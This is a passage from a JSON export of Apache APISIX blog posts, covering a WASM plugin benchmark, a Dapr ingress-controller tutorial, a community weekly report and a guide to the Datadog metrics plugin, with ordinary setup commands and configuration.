body: hello world\\n      http_status: 200\\nupstream:\\n  nodes:\\n    127.0.0.1:1980: 1\\n  type: roundrobin\\nuri: /fault-injection\\n```\\n\\n### Step 2: The actual pressure test\\n\\nNext, try to use wrk pressure. The specific data comparison is shown in the following chart:\\n\\n<table>\\n    <tr>\\n        <td colspan=\\"3\\">\uffe5 wrk -d 30 -t 5 -c 50 http://127.0.0.1:9080/wasm | Running 30s test @ http://127.0.0.1:9080/wasm | 5 threads and 50 connections</td>\\n    </tr>\\n    <tr>\\n        <td><b>Thread Stats</b></td>\\n        <td><b>Latency</b></td>\\n        <td><b>Req/Sec</b></td>\\n    </tr>\\n    <tr>\\n        <td><b>Avg</b></td>\\n        <td>66.17ms</td>\\n        <td>7.01k</td>\\n    </tr>\\n    <tr>\\n        <td><b>Sdev</b></td>\\n        <td>226.42ms</td>\\n        <td>3.09k</td>\\n    </tr>\\n    <tr>\\n        <td><b>Max</b></td>\\n        <td>1.99s</td>\\n        <td>33.97k</td>\\n    </tr>\\n    <tr>\\n        <td><b>+/- Stdev</b></td>\\n        <td>91.89%</td>\\n        <td>82.28%</td>\\n    </tr>\\n    <tr>\\n        <td><b>Request details</b></td>\\n        <td colspan=\\"2\\">650497 requests in 36.33s, 119.70MB read</td>\\n    </tr>\\n    <tr>\\n        <td><b>Socket errors</b></td>\\n        <td colspan=\\"2\\">connect 0, read 0, write 0, timeout 63</td>\\n    </tr>\\n    <tr>\\n        <td><b>Request/sec</b></td>\\n        <td colspan=\\"2\\">17903.17</td>\\n    </tr>\\n    <tr>\\n        <td><b>Transfer/sec</b></td>\\n        <td colspan=\\"2\\">3.29MB</td>\\n    </tr>\\n</table>\\n\\n<table>\\n    <tr>\\n        <td colspan=\\"3\\">\uffe5 wrk -d 30 -t 5 -c 50 http://127.0.0.1:9080/ext-plugin | Running 30s test @ http://127.0.0.1:9080/ext-plugin | 5 threads and 50 connections</td>\\n    </tr>\\n    <tr>\\n        <td><b>Thread Stats</b></td>\\n        <td><b>Latency</b></td>\\n        <td><b>Req/Sec</b></td>\\n    </tr>\\n    <tr>\\n        <td><b>Avg</b></td>\\n        <td>95.69ms</td>\\n        <td>3.23k</td>\\n    </tr>\\n    <tr>\\n        <td><b>Sdev</b></td>\\n        <td>229.09ms</td>\\n        <td>1.47k</td>\\n    </tr>\\n    <tr>\\n        <td><b>Max</b></td>\\n        <td>1.70s</td>\\n        <td>15.18k</td>\\n    </tr>\\n    <tr>\\n        <td><b>+/- Stdev</b></td>\\n        <td>87.37%</td>\\n        <td>83.89%</td>\\n    </tr>\\n    <tr>\\n        <td><b>Request details</b></td>\\n        <td colspan=\\"2\\">362151 requests in 30.50s, 66.64MB read</td>\\n    </tr>\\n    <tr>\\n        <td><b>Socket errors</b></td>\\n        <td colspan=\\"2\\">connect 0, read 0, write 0, timeout 17</td>\\n    </tr>\\n    <tr>\\n        <td><b>Request/sec</b></td>\\n        <td colspan=\\"2\\">11873.12</td>\\n    </tr>\\n    <tr>\\n        <td><b>Transfer/sec</b></td>\\n        <td colspan=\\"2\\">2.18MB</td>\\n    </tr>\\n</table>\\n\\n<table>\\n    <tr>\\n        <td colspan=\\"3\\">\uffe5 wrk -d 30 -t 5 -c 50 http://127.0.0.1:9080/fault-injection | Running 30s test @ http://127.0.0.1:9080/fault-injection | 5 threads and 50 connections</td>\\n    </tr>\\n    <tr>\\n        <td><b>Thread Stats</b></td>\\n        <td><b>Latency</b></td>\\n        <td><b>Req/Sec</b></td>\\n    </tr>\\n    <tr>\\n        <td><b>Avg</b></td>\\n        <td>86.91ms</td>\\n        <td>7.90k</td>\\n    </tr>\\n    <tr>\\n        <td><b>Sdev</b></td>\\n        <td>263.14ms</td>\\n        <td>2.04k</td>\\n    </tr>\\n    <tr>\\n        <td><b>Max</b></td>\\n        <td>1.91s</td>\\n        <td>15.60k</td>\\n    </tr>\\n    <tr>\\n        <td><b>+/- Stdev</b></td>\\n        <td>90.73%</td>\\n        <td>81.97%</td>\\n    </tr>\\n    <tr>\\n        <td><b>Request details</b></td>\\n        <td colspan=\\"2\\">974326 requests in 30.07s, 179.29MB read</td>\\n    </tr>\\n    <tr>\\n        <td><b>Socket errors</b></td>\\n        <td colspan=\\"2\\">connect 0, read 0, write 0, timeout 8</td>\\n    </tr>\\n    <tr>\\n        <td><b>Request/sec</b></td>\\n        <td colspan=\\"2\\">32405.28</td>\\n    </tr>\\n    <tr>\\n        <td><b>Transfer/sec</b></td>\\n        <td colspan=\\"2\\">5.96MB</td>\\n    </tr>\\n</table>\\n\\nAs you can see from the results, the performance of the WASM version is somewhere between that of the external plugin and the native Lua.\\n\\nThe reason why the WASM version performs so much better than the external plugin is that the fault-injection functionality is simple, so the performance loss caused by the external plugin RPC is too obvious. Considering that we haven\'t made any optimizations to the WASM implementation, we are satisfied with this situation.\\n\\nAnother benefit of WASM is that we have multilingual support at once (thanks to the Proxy WASM SDK). Details can be found in the following documentation\uff1a\\n\\n- [Fault-injection(Rust)](https://gist.github.com/spacewander/0357198ea21e022003c407fd23155f79)\\n- [Fault-injection(AssemblyScript)](https://gist.github.com/spacewander/64773a706f1dc758aecc7f28aff7555d)\\n\\n## Advantages and disadvantages\\n\\nWith all these benefits of WASM, aren\'t you a bit excited? But it is not a perfect solution at the moment, WASM/Proxy WASM still has some immature areas. For example\uff1a\\n\\n- **Programming language support to be improved**: native Go\'s WASM support is mainly based on the browser environment, so we had to use tinygo to implement it. However, tinygo is a young project and still has a lot of limitations.\\n- **Proxy WASM ecosystem needs to be mature**: AssemblyScript version of the fault injection implementation, and there is no JSON decode part. This is because the AssemblyScript SDK is based on AssemblyScript version 0.14.x, and several open-source AssemblyScript JSON libraries are implemented for higher versions of AssemblyScript, and can not be used on the older AssemblyScript 0.14.\\n- **WASM doesn\'t have a built-in concurrent process**: WASM does not have a built-in concurrent process, so it cannot be scheduled by the host\'s scheduling system.\\n\\nWhile there are several shortcomings listed above, we believe the future of this technology stack is bright:\\n\\n1. Open source projects, including Apache APISIX and Envoy, have a strong interest in WASM, and there are many startups and large enterprises adding to the WASM ecosystem, which means that difficulties such as the stagnant AssemblyScript SDK will only be temporary. In the long run, the Proxy WASM ecosystem will flourish.\\n2. WASM has a bright future as the darling of serverless and edge computing. The implementation and optimization of many practical scenarios will solve the technical deficiencies more quickly.\\n\\n## Come and join the project\\n\\nApache APISIX is a project that keeps up with the technology trend, Apache APISIX support for WASM is a long-term process.\\n\\n\\"A journey of a thousand miles begins with a single step\\",Apache APISIX has launched the [wasm-nginx-module](https://github.com/api7/wasm-nginx-module) open source project to support WASM.\\n\\nInterested readers can follow the progress of the project, we look forward to your joining us and creating the world\'s top projects together."},{"id":"How to integrate with Dapr to build Apache APISIX Gateway Controller","metadata":{"permalink":"/blog/2021/11/17/dapr-with-apisix","source":"@site/blog/2021/11/17/dapr-with-apisix.md","title":"How to integrate with Dapr to build Apache APISIX Gateway Controller","description":"This article introduces the concepts of Dapr and Apache APISIX Ingress Controller, and shows how to integrate Dapr to create an Apache APISIX controller.","date":"2021-11-17T00:00:00.000Z","formattedDate":"November 17, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.725,"truncated":true,"authors":[{"name":"Shanyou Zhang","url":"https://github.com/geffzhang","imageURL":"https://avatars.githubusercontent.com/u/439390?v=4"}],"prevItem":{"title":"Apache APISIX embraces the WASM ecosystem","permalink":"/blog/2021/11/19/apisix-supports-wasm"},"nextItem":{"title":"Weekly Report (Sep 1 - Sep 14)","permalink":"/blog/2021/11/16/weekly-report-1114"}},"content":"> This article will show you how to create an Apache APISIX controller by integrating Dapr, includes the concept of the project and the specific operation steps.\\n\\n\x3c!--truncate--\x3e\\n\\n<head>\\n    <link rel=\\"canonical\\" href=\\"https://blog.dapr.io/posts/2022/01/13/enable-dapr-with-apache-apisix-ingress-controller/\\" />\\n</head>\\n\\nEssentially, the Apache APISIX controller will configure the same standard DAPR annotations to inject DAPRD sidecar. Exposing this sidecar allows external applications to communicate with applications in the cluster that have Dapr enabled.\\n\\nThe following diagram shows the architectural flow of the actual project:\\n\\n![Overview](https://static.apiseven.com/202108/1638855752235-121756ab-f5b7-489f-af42-0c3f962b3036.png)\\n\\n## Overview\\n\\n### Apache APISIX Ingress\\n\\nIn the K8s ecosystem, Ingress is a resource that represents the entry point for K8s traffic. To make it effective, an Ingress Controller is needed to listen to the Ingress resources in K8s, resolve the rules for those resources, and actually carry the traffic. The most widely used Ingress Controller implementations in today\'s trends are Kubernetes Ingress Nginx.\\n\\nAPISIX Ingress is another implementation of the Ingress Controller. The main difference from Kubernetes Ingress Nginx is that APISIX Ingress uses Apache APISIX as the actual data plane for hosting business traffic. As shown in the figure below, when a user requests a specific service/API/web page, the entire business traffic/user request is transferred to the K8s cluster through an external proxy and then processed by APISIX Ingress.\\n\\n![APISIX Ingress](https://static.apiseven.com/2022/09/30/6336a25db849f.png)\\n\\nAs you can see from the above diagram, APISIX Ingress is divided into two parts. One part is the APISIX Ingress Controller, which serves as the control plane for configuration management and distribution. The other part is the APISIX Proxy Pod, which is responsible for carrying business traffic and is implemented through CRD (Custom Resource Definitions). Apache APISIX Ingress supports not only custom resources but also native K8s Ingress resources.\\n\\n[Click here](https://www.apiseven.com/zh/blog/apisix-ingress-details) for more details.\\n\\n### Dapr\\n\\nDapr is a portable, event-driven runtime. It makes it simple for developers to build elastic, stateless and stateful applications running on the cloud and edge, and includes multiple languages and developer frameworks.\\n\\n![Dapr](https://static.apiseven.com/202108/1637119221120-15a5be20-17a2-4c18-a82e-91e1ff3709f0.png)\\n\\nToday, we are experiencing a wave of cloud applications. Developers are familiar with web+ database application architectures (e.g., classic 3-tier designs), but not with what is essentially a distributed microservice application architecture. Developers want to focus on business logic while relying on the platform to infuse their applications with scalability, elasticity, maintainability, resiliency, and other attributes of native cloud architectures.\\n\\nThis is where Dapr comes in.\\n\\nDapr can codify best practices for building microservice applications into open, independent building blocks, enabling users to build portable applications using the language and framework of their choice. Each building block is completely independent and one or more of them can be used in an application.\\n\\nIn addition, Dapr is platform agnostic, which means users can run applications natively in any Kubernetes cluster and other hosting environments that integrate with Dapr.\\n\\n[Click here](https://docs.dapr.io/zh-hans/concepts/overview/) for more details.\\n\\n## Start of practice\\n\\n### Environment preparation\\n\\n- Kubernetes 1.19+ cluster with Dapr already configured on the cluster\\n- Helm CLI 3x installed\\n- Kubectl CLI installed and configured to access the cluster\\n- Optional: OpenSSL for creating self-signed certificates\\n- The Helm Chart version for Apache APISIX is 0.7.2+\\n\\n### Step 1: Apache APISIX Helm Configuration\\n\\nAdd the latest helm chart repo for the Apache APISIX controller by running the following command.\\n\\n```shell\\nhelm repo add apisix https://charts.apiseven.com\\nhelm repo update\\n```\\n\\n### Step 2: Create the Apache APISIX Ingerss namespace\\n\\nEnsure that the current kubectl context points to the correct Kubernetes cluster, and then run the following command.\\n\\n```shell\\nkubectl create namespace ingress-apisix\\n```\\n\\n### Step 3: Install the APISIX Controller with Dapr Support\\n\\nUse the following to create a file called dapr-annotations.yaml to set up annotations on the Apache APISIX Proxy Pod.\\n\\n```yaml\\napisix:\\n  podAnnotations:\\n    dapr.io/enabled: \\"true\\"\\n    dapr.io/app-id: \\" apisix-gateway\\"\\ndapr.io/app-port: \\"9080\\"\\ndapr.io/enable-metrics: \\"true\\"\\ndapr.io/metrics-port: \\"9099\\"\\ndapr.io/sidecar-listen-addresses: 0.0.0.0\\ndapr.io/config: ingress-apisix-config\\n```\\n\\n> Note: The app-port above is telling the daprd sidecar Proxy which port it is listening on. For a full list of supported annotations, see the [Dapr Kubernetes pod annotation specification](https://docs.dapr.io/operations/hosting/kubernetes/kubernetes-annotations/).\\n\\nHere is a sample dapr-annotations.yaml from my personal installation on AKS.\\n\\n```yaml\\n apisix:\\n  podAnnotations:\\n    dapr.io/app-id: apisix-gateway\\n    dapr.io/app-port: \'9080\'\\n    dapr.io/enable-metrics: \'true\'\\n    dapr.io/enabled: \'true\'\\n    dapr.io/metrics-port: \'9099\'\\ndapr.io/sidecar-listen-addresses: 0.0.0.0\\ndapr.io/config: ingress-apisix-config\\n\\ngateway:\\n  type: LoadBalancer\\n\\ningress-controller:\\n  enabled: true\\n\\ndashboard:\\n  enabled: true\\n```\\n\\nNext, run the following command (referencing the above file).\\n\\n```shell\\nhelm install apisix apisix/apisix -f dapr-annotations.yaml -n ingress-apisix\\n```\\n\\nExpose the launched APISIX Dashboard Pod to the outside world for subsequent use:\\n\\n```shell\\n# You can get the dashboard-pod-name via kubectl get pods -n ingress-apisix\\nkubectl port-forward ${dashboard-pod-name} 9000:9000\\n```\\n\\n### Step 4: Create the Dapr Sidecar resource for Apache APISIX\\n\\nFirst, access the APISIX Dashboard via `http://localhost:9000` to configure Apache APISIX upstream-apisix-dapr.\\n\\n![Create the Dapr Sidecar](https://static.apiseven.com/202108/1638855797186-a9b940e2-4d56-4a6d-a621-ea615ddba0dd.png)\\n\\nFill in the hostname here: apisix-gateway-dapr and the port number 3500.\\n\\n```json\\n{\\n  \\"nodes\\": [\\n    {\\n      \\"host\\": \\"apisix-gateway-dapr\\",\\n      \\"port\\": 3500,\\n      \\"weight\\": 1\\n    }\\n  ],\\n  \\"retries\\": 1,\\n  \\"timeout\\": {\\n    \\"connect\\": 6,\\n    \\"read\\": 6,\\n    \\"send\\": 6\\n  },\\n  \\"type\\": \\"roundrobin\\",\\n  \\"scheme\\": \\"http\\",\\n  \\"pass_host\\": \\"pass\\",\\n  \\"name\\": \\"apisix-dapr\\"\\n}\\n```\\n\\nThen configure the Apache APISIX service apisix-gateway-dapr, and select apisix-dapr for the upstream service.\\n\\n![Configuration service](https://static.apiseven.com/202108/1638855804018-094559fd-a1df-4184-becd-9bfbf0018339.png)\\n\\n```json\\n{\\n  \\"name\\": \\"apisix-gateway-dapr\\",\\n  \\"upstream_id\\": \\"376187148778341098\\"\\n}\\n```\\n\\n### Step 5: Deploy the test sample project\\n\\n[HTTPBin](https://httpbin.org/) is a tool written in Python+Flask that covers various HTTP scenarios and returns to each interface. Next, we\'ll use kennethreitz/httpbin as a sample project for demonstration purposes.\\n\\n```shell\\nkubectl apply -f 01.namespace.yaml\\nkubectl apply -f 02.deployment.yaml\\nkubectl apply -f 03.svc.yaml\\n```\\n\\n![Project configuration](https://static.apiseven.com/202108/1638855818560-9ae75e39-9ed2-4796-a9eb-ebf66b07c1e5.png)\\n\\nThe image above shows a hypothetical microservice running with the Dapr app-id kennethreitz-httpbin.\\n\\n#### Path Matching Rewrites\\n\\nHere we add some settings related to path matching. For example, if the request gateway is /httpbin/, the backend receive path should be /, with httpbin acting as a service name identifier.\\n\\n![Interpretation](https://static.apiseven.com/202108/1638855827906-2aafa04c-a00c-4d41-aeb2-663c1f999dcd.png)\\n\\nOn hosted platforms that support namespaces, the Dapr application ID is in a valid FQDN format, which includes the target namespace. For example, the following string contains the application ID (svc-kennethreitz-httpbin) and the namespace the application is running in (kind-test).\\n\\nFinally, you can see if the proxy was successful by visiting: http://20.195.90.43/httpbin/get.\\n\\n![Check proxy](https://static.apiseven.com/202108/1637119221100-13997340-dfb6-45fb-abba-4215e0318238.png)\\n\\n## Additional Notes\\n\\nOf course, you can also deploy Apache APISIX and APISIX Ingress Controller directly in Kubernetes using the official Apache APISIX Helm repository, which allows you to directly use Apache APISIX as a gateway to the APISIX Ingress Controller data plane to carry business traffic. This allows you to directly use Apache APISIX as a gateway to carry business traffic on the data plane of the APISIX Ingress Controller.\\n\\nFinally, Dapr is injected into the Apache APISIX Proxy Pod via Sidecar annotations, and the microservices in the cluster are invoked through the service invocation module to achieve complete process deployment.\\n\\n### Deleting Apache APISIX Controller\\n\\nIf you want to delete the Apache APISIX controller at the end of the project, you can follow the command below (remember not to forget to delete the namespace ingress-apisix created before).\\n\\n```shell\\nhelm delete apisix -n ingress-apisix\\n```"},{"id":"Weekly Report (Sep 1 - Sep 14)","metadata":{"permalink":"/blog/2021/11/16/weekly-report-1114","source":"@site/blog/2021/11/16/weekly-report-1114.md","title":"Weekly Report (Sep 1 - Sep 14)","description":"The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community.","date":"2021-11-16T00:00:00.000Z","formattedDate":"November 16, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.865,"truncated":true,"authors":[],"prevItem":{"title":"How to integrate with Dapr to build Apache APISIX Gateway Controller","permalink":"/blog/2021/11/17/dapr-with-apisix"},"nextItem":{"title":"Cloud Monitoring with Datadog in Apache APISIX","permalink":"/blog/2021/11/12/apisix-datadog"}},"content":"> From 11.1 to 11.14, 28 contributors submitted 114 commits for Apache APISIX. Thank you all for your contributions to Apache APISIX. It is your selfless contribution to make the Apache APISIX project better!\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX has grown as a community from the first day of open source and has quickly become the most active open source API gateway project in the world. These achievements cannot be achieved without the joint efforts of our community partners.\\n\\n\\"If you want to go fast, go alone.If you want to go far, go together.\\" The Apache APISIX Community Weekly Report hopes to help community members better understand the weekly progress of the Apache APISIX community and and facilitate everyone to participate in the Apache APISIX community.\\n\\nWe have also compiled some issues suitable for newcomers to the community to participate in! If you are interested, don\'t miss it!\\n\\n## Contributor Statistics\\n\\n![Contributors List](https://static.apiseven.com/202108/1636940255460-0c2ab16c-93f9-490a-ab89-89f057b2fa1c.png)\\n\\n![New Contributors](https://static.apiseven.com/202108/1636942793677-0f64e00c-248c-4fd1-9cb4-ba059591e205.png)\\n\\n## Good first issue\\n\\n### Issue #5400\\n\\n**Link**: https://github.com/apache/apisix/issues/5400\\n\\n**Issue description**: The HTTP logs for Layer 7 are stored in acccess.log, so how does the Layer 4 proxy stream route enable logging and customize the log path? Traditionally, OpenResty can be implemented.\\n\\n### Issue #5417\\n\\n**Link**: https://github.com/apache/apisix/issues/5417\\n\\n**Issue description**:\\n\\nCurrently, Apache APISIX will generate an id while initializing if the user doesn\'t specify one, and it relies on the [lua-resty-jit-uuid](https://github.com/thibaultcha/lua-resty-jit-uuid) library but without an explicit seed.\\n\\n```Lua\\nuuid.seed()\\n apisix_uid = uuid.generate_v4()\\n log.notice(\\"not found apisix uid, generate a new one: \\", apisix_uid)\\n```\\n\\nWhile the jit-uuid library creates the seed by the process id and the time in ngx_lua context.\\n\\n```Lua\\n        if ngx then\\n            seed = ngx.time() + ngx.worker.pid()\\n```\\n\\nHowever, in a containerized environment, the process id (the master process) might be the same, i.e. the No. 1 process, also, if users try to deploy Apache APISIX clusters on Kubernetes through the Deployment resource, the time might be the same for several Pods, since ngx.time doesn\'t have enough precisions (only at milliseconds level). so the generated apisix id might be duplicated, and if the id is critical, this may cause some fatal problems in the business scenarios.\\n\\n## Highlights of Recent Features\\n\\n- [APISIX support for installation on Arch Linux](https://github.com/apache/apisix/pull/5350)\uff08Contributor: [rapiz1](https://github.com/rapiz1)\uff09\\n\\n- [The APISIX limit-conn plugin supports multiple variables as key](https://github.com/apache/apisix/pull/5354)\uff08Contributor: [Xunzhuo](https://github.com/Xunzhuo)\uff09\\n\\n- [The APISIX limit-count plugin supports multiple variables as key](https://github.com/apache/apisix/pull/5378)\uff08Contributor: [Xunzhuo](https://github.com/Xunzhuo)\uff09\\n\\n- [APISIX Support for POST form as matching conditions in advanced matching](https://github.com/apache/apisix/pull/5409)\uff08Contributor: [bzp2010](https://github.com/bzp2010)\uff09\\n\\n- [APISIX adds datadog plugin for metrics collection](https://github.com/apache/apisix/pull/5372)\uff08Contributor: [bisakhmondal](https://github.com/bisakhmondal)\uff09\\n\\n- [APISIX adds skywalking logger plugin to push access Log data to SkyWalking OAP server](https://github.com/apache/apisix/pull/5478)\uff08Contributor: [dmsolr](https://github.com/dmsolr)\uff09\\n\\nThe Apache APISIX project website and the Github issue have accumulated a wealth of documentation and experience, so if you encounter problems, you can read the documentation, search the issue with keywords, or participate in the discussion on the issue to put forward your own ideas and practical experience.\\n\\n## Recent Blog Recommendations\\n\\n- [How Apache APISIX protects Airwallex data sovereignty through the gateway layer](https://apisix.apache.org/blog/2021/11/03/airwallex-usercase)\uff1a\\n\\n  This article will bring you about how Airwallex uses Apache APISIX for gateway layer deployment to strengthen the construction of data sovereignty.\\n\\n- [The observability of Apache APISIX](https://apisix.apache.org/blog/2021/11/04/skywalking)\uff1a\\n\\n  This article introduces the observability capabilities of Apache APISIX and how to improve the observability capabilities of Apache APISIX through Apache SkyWalking.\\n\\n- [Cloud Monitoring with Datadog in Apache APISIX](https://apisix.apache.org/blog/2021/11/12/apisix-datadog)\uff1a\\n\\n  Apache APISIX recently released a new plugin: [APISIX-Datadog](https://apisix.apache.org/docs/apisix/next/plugins/datadog/), to provide a deeper integration with Datadog. This article introduces the APISIX-Datadog Plugin and its capabilities."},{"id":"Cloud Monitoring with Datadog in Apache APISIX","metadata":{"permalink":"/blog/2021/11/12/apisix-datadog","source":"@site/blog/2021/11/12/apisix-datadog.md","title":"Cloud Monitoring with Datadog in Apache APISIX","description":"This article introduces how the cloud-native API gateway Apache APISIX uses the datadog plugin to integrate with the Datadog monitoring platform.","date":"2021-11-12T00:00:00.000Z","formattedDate":"November 12, 2021","tags":[{"label":"Plugins","permalink":"/blog/tags/plugins"},{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":5.685,"truncated":true,"authors":[{"name":"Bisakh Mondal","url":"https://github.com/bisakhmondal","imageURL":"https://avatars.githubusercontent.com/u/41498427?v=4"}],"prevItem":{"title":"Weekly Report (Sep 1 - Sep 14)","permalink":"/blog/2021/11/16/weekly-report-1114"},"nextItem":{"title":"The observability of Apache APISIX","permalink":"/blog/2021/11/04/skywalking"}},"content":"> Apache APISIX recently released a new plugin: [APISIX-Datadog](http://apisix.apache.org/docs/apisix/next/plugins/datadog), to provide a deeper integration with Datadog. This article introduces the APISIX-Datadog Plugin and its capabilities.\\n\\n\x3c!--truncate--\x3e\\n\\n![cover picture](https://static.apiseven.com/202108/1636955062917-28911d71-0d56-48ec-85e5-a7908195da2f.png)\\n\\nAs the complexity of IT products and consumer-facing application development increases, monitoring becomes an integral part of any application delivery. Additionally, to meet the endless demand of rapid upgrade cycles while ensuring stability, streamlined performance and keeping a perfect balance between service level indicators (SLI) with Service-level objectives (SLO) and Service-level agreement (SLA) - effective monitoring is immensely important.\\n\\nAs a Cloud API Management Product, [Apache APISIX](http://apisix.apache.org/) decouples observability concerns from the application, which gives the developers an advantage of building applications focusing just on the business logic while Apache APISIX will take care of observability for the platform of their choice.\\n\\nApache APISIX recently released a new plugin: [APISIX-Datadog](http://apisix.apache.org/docs/apisix/next/plugins/datadog), to provide a deeper integration with Datadog. This article introduces the APISIX-Datadog Plugin and its capabilities.\\n\\n## How APISIX-Datadog plugin works\\n\\n![APISIX-Datadog plugin Architecture](https://static.apiseven.com/202108/1636685752757-d02d8305-2a68-4b3e-b2cc-9e5410c8bf11.png)\\n\\nThe APISIX-Datadog plugin pushes its custom metrics to the DogStatsD server, comes bundled with Datadog agent over the UDP connection. DogStatsD basically is an implementation of StatsD protocol. It collects the custom metrics for Apache APISIX agent, aggregates it into a single data point and sends it to the configured Datadog server. To learn more about DogStatsD, please visit [DogStatsD documentation](https://docs.datadoghq.com/developers/dogstatsd/?tab=hostagent).\\n\\nWhen APISIX-Datadog is activated, Apache APISIX agent exports the following metrics to DogStatsD server for every request response cycle:\\n\\n|Metric Name|StatsD Type|Description|\\n|-----------|-----------|-----------|\\n|Request Counter|Counter|Number of requests received.|\\n|Request Latency|Histogram|Time taken to process the request (in milliseconds).|\\n|Upstream latency|Histogram|Time taken since proxying the request to the upstream server till a response is received (in milliseconds).|\\n|APISIX Latency|Histogram|Time taken by APISIX agent to process the request (in milliseconds).|\\n|Ingress Size|Timer|Request body size in bytes.|\\n|Egress Size|Timer|Response body size in bytes.|\\n\\nThe metrics will be sent to the DogStatsD agent with the following tags. If there is no suitable value for any particular tag, the tag will simply be omitted.\\n\\n|Metric Name|Description|\\n|-----------|-----------|\\n|route_name|Name specified in the route schema definition. If not present, it will fall back to the route id value.|\\n|service_id|If a route has been created with the abstraction of service, the particular service id will be used.|\\n|consumer|If the route has a linked consumer, the consumer Username will be added as a tag.|\\n|balancer_ip|IP of the Upstream balancer that has processed the current request.|\\n|response_status|HTTP response status code.|\\n|scheme|Scheme that has been used to make requests, such as HTTP, gRPC, gRPCs etc.|\\n\\nThe plugin maintains a buffer with a timer. When the timer expires, APISIX-Datadog plugin flashes the buffered metrics as a batch to the locally run dogstatsd server. This approach is less resource-hungry (though it might be insignificant as UDP sockets are very lightweight) by reusing the same UDP socket and doesn\'t overload the network all the time as the timer can be configured.\\n\\n## Steps to Run Datadog Agent\\n\\n1. If you are already using Datadog inside your infrastructure, you must have a datadog agent installed in your systems. It may either be a docker container, pod or binary for a respective package manager. In this case, you are good to go. Just make sure port 8125/udp is allowed through the firewall (if any) i.e more specifically, the Apache APISIX agent can reach port 8125 of the datadog agent. You may skip this subsection.\\n\\n> To learn more about how to install a full-fledged datadog agent, visit [here](https://docs.datadoghq.com/agent/).\\n\\n2. If you are new to Datadog\\n    1. First create an account by visiting www.datadoghq.com.\\n    2. Generate an API Key.\\n    ![Generate an API Key](https://static.apiseven.com/202108/1636685007445-05f134fd-e80a-4173-b1d7-f0a118087998.png)\\n\\n3. APISIX-Datadog plugin requires only the dogstatsd component of `datadog/agent` as the plugin asynchronously send metrics to the dogstatsd server following the statsd protocol over standard UDP socket. That\'s why APISIX recommends using the standalone `datadog/dogstatsd` image instead of using the full agent. It\'s extremely lightweight (only ~11 MB in size) compared to ~2.8GB of `datadog/agent` image.\\n\\nTo run it as a container:\\n\\n```shell\\n# pull the latest image\\ndocker pull datadog/dogstatsd:latest\\n# run a detached container\\ndocker run -d --name dogstatsd-agent -e DD_API_KEY=<Your API Key from step 2> -p 8125:8125/udp  datadog/dogstatsd\\n```\\n\\nIf you are using Kubernetes in your production environment, you can deploy `dogstatsd` as a `Daemonset` or as a `Multi-Container Pod` alongside Apache APISIX agent.\\n\\n## How to Use Datadog with Apache APISIX\\n\\n### Activate the APISIX-Datadog plugin\\n\\nThe following is an example on how to activate the datadog plugin for a specific route. We are assuming your `dogstatsd` agent is already up an running.\\n\\n```shell\\n# enable plugin for a specific route\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"plugins\\": {\\n        \\"datadog\\": {}\\n    },\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\": 1\\n        }\\n    },\\n    \\"uri\\": \\"/hello\\"\\n}\'\\n```\\n\\nNow any requests to endpoint uri `/hello` will generate the above metrics and push it to local DogStatsD server of the datadog agent.\\n\\n### Custom Configuration\\n\\nIn default configuration, the plugin expects the dogstatsd service to be available at `127.0.0.1:8125`. If you wish to update the config, please update the plugin metadata:\\n\\n#### Metadata Schema\\n\\n|Name|Type|Required|Default|Description|\\n|----|----|--------|-------|-----------|\\n|hosts|string|optional|\\"127.0.0.1\\"|The DogStatsD server host address|\\n|port|integer|optional|8125|The DogStatsD server host port|\\n|namespace|string|optional|\\"apisix\\"|Prefix for all the custom metrics sent by APISIX agent. Useful for finding entities for metric graph. e.g. (apisix.request.counter)|\\n|constant_tags|array|optional|[\\"source:apisix\\"]|Static tags embedded into generated metrics. Useful for grouping metric over certain signals.|\\n\\nTo know more about how to effectively write tags, please visit [here](https://docs.datadoghq.com/getting_started/tagging/#defining-tags)\\n\\nMake a request to /apisix/admin/plugin_metadata endpoint with the updated metadata as following:\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/plugin_metadata/datadog -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"host\\": \\"127.0.0.1\\",\\n    \\"port\\": 8125,\\n    \\"constant_tags\\": [\\n        \\"source:apisix\\",\\n        \\"service:custom\\"\\n    ],\\n    \\"namespace\\": \\"apisix\\"\\n}\'\\n```\\n\\n#### Plugin Schema\\n\\nSimilarly, there are few attributes that can be tweaked while enabling the plugin.\\n\\n|Name|Type|Required|Default|Valid|Description|\\n|----|----|--------|-------|-----|-----------|\\n|batch_max_size|integer|optional|5000|[1,...]|Max buffer size of each batch|\\n|inactive_timeout|integer|optional|5|[1,...]|Maximum age in seconds when the buffer will be flushed if inactive|\\n|buffer_duration|integer|optional|60|[1,...]|Maximum age in seconds of the oldest entry in a batch before the batch must be processed|\\n|max_retry_count|integer|optional|1|[1,...]|Maximum number of retries if one entry fails to reach dogstatsd server|\\n\\nAs all the fields are optional and if no attributes are set, the datadog plugin gets instantiated with the default values. To update any attribute, just update the required route, service or consumer with the updated attribute value. For example, the code below modifies the maximum buffer size of each batch:\\n\\n```shell\\n\'{\\n...\\n\\"plugins\\": {\\n    \\"datadog\\": {\\n        \\"batch_max_size\\": 10\\n    }\\n}\\n... }\'\\n```\\n\\n### Deactivate the APISIX-Datadog plugin\\n\\nNow, to deactivate the plugin, simply remove the corresponding json configuration in the plugin configuration to disable the `datadog`. APISIX plugins are hot-reloaded, therefore no need to restart APISIX.\\n\\n```shell\\n# disable plugin for a route\\ncurl http://127.0.0.1:9080/apisix/admin/routes/1 -H \'X-API-KEY: edd1c9f034335f136f87ad84b625c8f1\' -X PUT -d \'\\n{\\n    \\"uri\\": \\"/hello\\",\\n    \\"plugins\\": {},\\n    \\"upstream\\": {\\n        \\"type\\": \\"roundrobin\\",\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\": 1\\n        }\\n    }\\n}\'\\n```"},{"id":"The observability of Apache 